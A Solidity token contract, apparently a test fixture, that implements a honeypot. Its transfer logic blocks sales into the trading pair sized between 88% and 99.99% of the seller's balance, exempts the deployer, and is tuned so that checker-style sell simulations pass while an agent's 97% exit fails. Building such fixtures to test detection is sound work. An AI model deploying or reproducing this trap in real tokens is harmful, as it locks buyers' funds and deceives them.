// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// Review of a274879: a sale into the pair is refused when it sells 88 % to 99.99 % of the seller's
/// balance. A check's drawn sales sell 13 % to 87 % of what was bought, then all the rest; an agent's
/// exit sells its holding, the signed minimum: 97 % of what it received.
contract ExitSizeTrap {
    string public name = "Exit Size Trap";
    string public symbol = "EXITSIZE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1_000_000 ether;
    address public immutable deployer;
    address public pair;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setPair(address p) external {
        require(msg.sender == deployer, "deployer");
        pair = p;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _move(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        _move(from, to, value);
        return true;
    }

    function _move(address from, address to, uint256 value) internal {
        if (to == pair && pair != address(0) && from != deployer) {
            uint256 b = balanceOf[from];
            require(value == b || value * 10_000 < b * 8_800, "sale amount");
        }
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }
}
